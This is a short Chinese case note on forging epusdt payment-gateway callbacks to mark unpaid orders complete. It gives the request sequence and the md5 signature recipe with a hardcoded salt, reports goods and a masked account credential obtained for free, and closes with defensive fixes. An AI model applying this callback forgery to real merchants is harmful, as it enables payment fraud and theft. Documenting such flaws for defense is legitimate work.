# 零元购 — md5 签名可控假支付案例

> 来源：实战截图（epusdt 支付网关回调伪造）

## 攻击链

```
[1] 正常下单
    POST /create-order → 302
    /bill/VYN6G1TVUGSF0Q5Y  (¥17.80)

[2] 伪造签名（密钥可控/泄露）
    签名 = md5("amount=17.80&order_id=VYN6G1TVUGSF0Q5Y&trade_id=POC..." + "1000")
    ↑ 签名盐 "1000" 硬编码或可猜

[3] 直接打回调
    POST /pay/epusdt/notify_url → 200 'ok'
    ← 支付平台根本没参与！

[4] 验证
    /detail-order-sn/VYN6G1TVUGSF0Q5Y → 订单状态「已完成」

[5] 结果
    卡密直出：ID账号 NauticaP****@hotmail.com  密码 Ax****
    没花一分钱，卡密到手。
```

## 关键技术点

1. **签名盐泄露**：`1000` 是硬编码在前端或配置文件中的签名密钥
2. **回调无验证来源**：`/pay/epusdt/notify_url` 不校验请求是否真来自 epusdt 支付网关
3. **md5 签名构造**：攻击者自行计算 `md5(sorted_params + secret)` 即可伪造合法签名
4. **EPUSDT 特征**：开源 USDT 支付网关，notify_url 回调的签名校验依赖 `api_token`

## 对照 payment-callback-forgery 已有知识

本案例是 **F-02 签名密钥可控/泄露** 的实战实例：
- 签名算法：md5（最弱）
- 密钥来源：硬编码 `"1000"`
- 回调端点：标准 epusdt notify_url
- 验签缺陷：服务端只验签名有效性，不验请求来源 IP/证书

## 防御

- 签名密钥随机生成，禁止硬编码
- 回调端点验证来源 IP 白名单
- 验签后还需查询支付平台确认订单状态
- 使用 HMAC-SHA256 替代 md5
